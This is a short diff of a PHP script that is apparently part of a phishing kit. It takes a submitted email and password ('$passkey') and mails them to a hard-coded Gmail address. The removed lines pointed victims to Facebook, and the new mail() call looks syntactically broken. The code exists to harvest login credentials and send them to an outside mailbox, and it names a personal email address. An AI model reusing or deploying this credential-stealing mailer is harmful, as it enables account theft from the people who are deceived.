@@ -7,8 +7,8 @@ $recipient = "israelstoba@gmail.com";
 
 $mailheader = "From:".$email."<".$passkey.">\r\n";
 
-mail($recipient, $message, $mailheader)
+mail($recipient, $mailheader)
 or die("Error");
 
-echo "https://web.facebook.com";
+echo "message sent";
 ?>
